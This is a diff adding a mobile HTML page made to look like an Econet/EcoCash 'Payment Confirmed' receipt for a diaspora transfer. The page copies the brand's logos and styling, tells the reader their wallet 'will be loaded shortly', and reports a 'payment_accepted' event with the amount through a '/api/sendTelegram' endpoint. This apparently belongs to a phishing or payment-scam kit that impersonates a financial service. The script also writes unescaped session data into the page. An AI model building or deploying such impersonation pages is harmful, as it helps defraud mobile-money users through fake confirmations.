@@ -1,0 +1,389 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#0033a0"/>
+<title>Payment Confirmed · Econet</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+:root{
+  --navy:#0033a0;
+  --navy-dark:#001f6b;
+  --blue:#1a6fff;
+  --sky:#e8f1ff;
+  --sky-mid:#d0e4ff;
+  --sky-deep:#b8d3ff;
+  --green:#059669;
+  --green-pale:#ecfdf5;
+  --green-border:#a7f3d0;
+  --red:#d0021b;
+  --page:#f0f5ff;
+  --white:#ffffff;
+  --border:#d5e3f7;
+  --border-strong:#b8ccef;
+  --ink:#0a1f44;
+  --ink-mid:#2d4470;
+  --ink-soft:#6b82a8;
+  --ink-faint:#9eb5d4;
+  --font:'Plus Jakarta Sans',sans-serif;
+  --mono:'DM Mono',monospace;
+  --r:12px;
+  --r-lg:16px;
+  --shadow:0 1px 3px rgba(0,51,160,.08),0 4px 16px rgba(0,51,160,.06);
+}
+
+html,body{
+  width:100%;height:100%;height:100dvh;
+  overflow:hidden;font-family:var(--font);background:var(--page);
+}
+
+.screen{
+  display:flex;flex-direction:column;
+  width:100%;height:100%;height:100dvh;
+  max-width:430px;margin:0 auto;
+  background:var(--page);overflow:hidden;position:relative;
+}
+
+/* HEADER */
+.header{
+  background:var(--navy);
+  padding:16px 18px 20px;
+  flex-shrink:0;position:relative;overflow:hidden;
+}
+.header::before{
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);
+  background-size:32px 32px;pointer-events:none;
+}
+.hglow{
+  position:absolute;width:240px;height:240px;border-radius:50%;
+  background:rgba(5,150,105,.22);filter:blur(70px);
+  top:-100px;right:-60px;pointer-events:none;
+}
+
+.header-top{
+  display:flex;align-items:center;justify-content:space-between;
+  position:relative;z-index:1;margin-bottom:16px;
+}
+.brand{display:flex;align-items:center;gap:9px}
+.brand-logo-econet{height:24px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
+.brand-sep{width:1px;height:18px;background:rgba(255,255,255,.25)}
+.brand-logo-ecocash{height:30px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
+
+.status-chip{
+  background:rgba(5,150,105,.25);
+  border:1px solid rgba(52,211,153,.4);
+  padding:5px 12px;border-radius:999px;
+  font-size:11px;font-weight:700;
+  color:#6ee7b7;letter-spacing:.3px;
+}
+
+.header-body{position:relative;z-index:1}
+.hdr-label{
+  font-size:9px;font-weight:700;color:rgba(255,255,255,.5);
+  text-transform:uppercase;letter-spacing:1.2px;margin-bottom:3px;
+}
+.amount-row{display:flex;align-items:flex-end;gap:4px;margin-bottom:14px}
+.amount-cur{font-family:var(--mono);font-size:13px;font-weight:500;color:rgba(255,255,255,.55);margin-bottom:5px}
+.amount-num{font-family:var(--mono);font-size:38px;font-weight:700;color:#fff;line-height:1}
+
+/* SUCCESS ROW */
+.success-row{display:flex;align-items:center;gap:12px}
+.success-icon{
+  width:36px;height:36px;border-radius:50%;flex-shrink:0;
+  background:rgba(5,150,105,.25);
+  border:1.5px solid rgba(52,211,153,.4);
+  display:flex;align-items:center;justify-content:center;
+}
+.success-icon svg{stroke:#6ee7b7}
+.success-text{font-size:14px;font-weight:700;color:#fff}
+.success-sub{font-size:11px;color:rgba(255,255,255,.5);font-weight:500;margin-top:1px}
+
+/* BODY */
+.body{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  padding:16px 14px 32px;
+  overscroll-behavior:contain;min-height:0;
+}
+.body::-webkit-scrollbar{display:none}
+
+/* CARD */
+.card{
+  background:var(--white);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
+  overflow:hidden;margin-bottom:10px;
+  box-shadow:var(--shadow);
+}
+
+.card-top-bar{
+  height:3px;
+  background:linear-gradient(90deg,var(--red) 0%,var(--blue) 50%,var(--navy) 100%);
+}
+
+.card-hdr{
+  padding:12px 16px 11px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.card-title{font-size:14px;font-weight:800;color:var(--ink)}
+.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+
+.confirmed-badge{
+  background:var(--green-pale);
+  border:1px solid var(--green-border);
+  padding:4px 10px;border-radius:999px;
+  font-size:10px;font-weight:700;color:var(--green);
+  text-transform:uppercase;letter-spacing:.3px;
+  white-space:nowrap;
+}
+
+/* DETAIL ROWS */
+.detail-rows{padding:4px 0}
+.drow{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:11px 16px;border-bottom:1px solid var(--border);
+}
+.drow:last-child{border-bottom:none}
+.drow-key{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--ink-soft);font-weight:500}
+.ddot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.drow-val{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--ink);text-align:right}
+
+/* TOTAL */
+.total-row{
+  background:var(--sky);
+  border-top:1.5px solid var(--sky-deep);
+  padding:13px 16px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.total-lbl{font-size:13px;font-weight:700;color:var(--ink-mid)}
+.total-val{font-family:var(--mono);font-size:20px;font-weight:800;color:var(--navy)}
+
+/* WALLET NOTICE */
+.wallet-notice{
+  background:var(--green-pale);
+  border:1.5px solid var(--green-border);
+  border-radius:var(--r-lg);
+  padding:14px 16px;margin-bottom:10px;
+  box-shadow:var(--shadow);
+  display:flex;gap:12px;align-items:flex-start;
+}
+.wn-icon{
+  width:32px;height:32px;border-radius:50%;
+  background:var(--green);flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;margin-top:1px;
+}
+.wn-title{font-size:13px;font-weight:800;color:var(--green);margin-bottom:3px}
+.wn-body{font-size:12px;line-height:1.7;color:#065f46;font-weight:500}
+.wn-body strong{font-weight:800}
+
+/* NOTICE */
+.notice{
+  background:var(--white);
+  border:1.5px solid var(--border);
+  border-radius:var(--r-lg);
+  padding:14px 16px;margin-bottom:10px;
+  font-size:12px;line-height:1.7;color:var(--ink-soft);font-weight:500;
+  box-shadow:var(--shadow);
+}
+
+/* POWERED */
+.powered{
+  text-align:center;padding:6px 0 2px;
+  font-size:9px;color:var(--ink-faint);font-weight:500;letter-spacing:.3px;
+}
+.powered strong{color:var(--ink-soft);font-weight:700}
+
+/* CONFETTI */
+.confetti-wrap{position:absolute;inset:0;pointer-events:none;overflow:hidden;z-index:50}
+.confetti-wrap canvas{width:100%;height:100%}
+</style>
+</head>
+<body>
+<div class="screen">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="hglow"></div>
+    <div class="header-top">
+      <div class="brand">
+        <img src="assets/econet.png" alt="Econet" class="brand-logo-econet">
+        <div class="brand-sep"></div>
+        <img src="assets/ecocash.png" alt="EcoCash" class="brand-logo-ecocash">
+      </div>
+      <div class="status-chip">Accepted ✓</div>
+    </div>
+    <div class="header-body">
+      <div class="hdr-label">Payment Amount</div>
+      <div class="amount-row">
+        <span class="amount-cur">USD</span>
+        <span class="amount-num" id="headerAmount">0.00</span>
+      </div>
+      <div class="success-row">
+        <div class="success-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <div>
+          <div class="success-text">Payment Accepted</div>
+          <div class="success-sub">Your EcoCash wallet will be loaded shortly</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- BODY -->
+  <div class="body">
+
+    <div class="card">
+      <div class="card-top-bar"></div>
+      <div class="card-hdr">
+        <div>
+          <div class="card-title">Payment Confirmation</div>
+          <div class="card-sub">Your diaspora payment receipt</div>
+        </div>
+        <div class="confirmed-badge">Confirmed</div>
+      </div>
+      <div class="detail-rows" id="detailRows"></div>
+      <div class="total-row">
+        <div class="total-lbl">Amount Received</div>
+        <div class="total-val" id="totalVal">USD 0.00</div>
+      </div>
+    </div>
+
+    <div class="wallet-notice">
+      <div class="wn-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7"/><path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/>
+        </svg>
+      </div>
+      <div>
+        <div class="wn-title">EcoCash Wallet Loading</div>
+        <div class="wn-body" id="walletMsg">Your EcoCash wallet will be loaded shortly. You will receive a confirmation notification once funds are credited.</div>
+      </div>
+    </div>
+
+    <div class="notice">
+      Funds are typically credited within a few minutes. If you do not receive your payment within 24 hours, please contact Econet support with your confirmation details above.
+    </div>
+
+    <div class="powered">
+      Econet Financial Services &nbsp;·&nbsp; <strong>Terms and conditions apply</strong>
+    </div>
+
+  </div>
+
+  <div class="confetti-wrap"><canvas id="confettiCanvas"></canvas></div>
+</div>
+
+<script>
+(function(){
+  const amtEl   = document.getElementById("headerAmount");
+  const totalEl = document.getElementById("totalVal");
+  const rowsEl  = document.getElementById("detailRows");
+
+  function row(color, label, val){
+    return `<div class="drow"><div class="drow-key"><div class="ddot" style="background:${color}"></div>${label}</div><div class="drow-val">${val}</div></div>`;
+  }
+
+  function formatDate(iso){
+    if(!iso) return "—";
+    const [y,m,d] = iso.split('-');
+    const months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
+    return `${d} ${months[parseInt(m)-1]} ${y}`;
+  }
+
+  function formatTime(t){
+    if(!t) return "—";
+    const [hh,mm] = t.split(':');
+    const h = parseInt(hh);
+    const ap = h >= 12 ? 'PM' : 'AM';
+    const h12 = h % 12 || 12;
+    return `${h12}:${mm} ${ap} (Harare)`;
+  }
+
+  /* Read diaspora payment from session */
+  let diaspora = null;
+  try{ diaspora = JSON.parse(sessionStorage.getItem("diasporaPay")); }catch(e){}
+
+  const amount   = (diaspora && diaspora.amount)   || "0.00";
+  const sender   = (diaspora && diaspora.sender)   || "—";
+  const receiver = (diaspora && diaspora.receiver) || "—";
+  const date     = (diaspora && diaspora.date)     || "";
+  const time     = (diaspora && diaspora.time)     || "";
+
+  amtEl.textContent  = amount;
+  totalEl.textContent = "USD " + amount;
+
+  rowsEl.innerHTML =
+    row("#9eb5d4", "Sender",         sender) +
+    row("#1a6fff", "Receiver",       receiver) +
+    row("#6366f1", "Date Submitted", formatDate(date)) +
+    row("#059669", "Time",           formatTime(time));
+
+  /* Personalise wallet message */
+  document.getElementById("walletMsg").innerHTML =
+    `Your EcoCash wallet will be loaded with <strong>USD ${amount}</strong> from <strong>${sender}</strong>. You will receive an EcoCash notification once the transfer is complete.`;
+
+  /* Telegram — amount only */
+  try{
+    fetch("/api/sendTelegram", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        event: "payment_accepted",
+        amount,
+        submittedAt: new Date().toISOString()
+      })
+    });
+  }catch(e){}
+
+  /* Confetti */
+  const canvas = document.getElementById("confettiCanvas");
+  const ctx    = canvas.getContext("2d");
+  canvas.width = canvas.offsetWidth || 375;
+  canvas.height = 260;
+  const cols = ["#1a6fff","#059669","#f59e0b","#d0021b","#6366f1","#0033a0"];
+  const pieces = Array.from({length:60}, () => ({
+    x: Math.random() * canvas.width,
+    y: -10 - Math.random() * 80,
+    w: 5 + Math.random() * 4,
+    h: 7 + Math.random() * 5,
+    color: cols[Math.floor(Math.random() * cols.length)],
+    speed: 1.4 + Math.random() * 2,
+    drift: (Math.random() - .5),
+    angle: Math.random() * 360,
+    spin:  (Math.random() - .5) * 3.5,
+    opacity: 1
+  }));
+  let frame = 0;
+  function draw(){
+    if(frame > 200){ ctx.clearRect(0, 0, canvas.width, canvas.height); return; }
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    pieces.forEach(p => {
+      p.y += p.speed; p.x += p.drift; p.angle += p.spin;
+      if(frame > 140) p.opacity = Math.max(0, 1 - (frame - 140) / 60);
+      ctx.save();
+      ctx.globalAlpha = p.opacity;
+      ctx.translate(p.x + p.w/2, p.y + p.h/2);
+      ctx.rotate(p.angle * Math.PI / 180);
+      ctx.fillStyle = p.color;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+      if(p.y > canvas.height + 10){ p.y = -10; p.x = Math.random() * canvas.width; }
+    });
+    frame++;
+    requestAnimationFrame(draw);
+  }
+  setTimeout(draw, 150);
+})();
+</script>
+</body>
+</html>
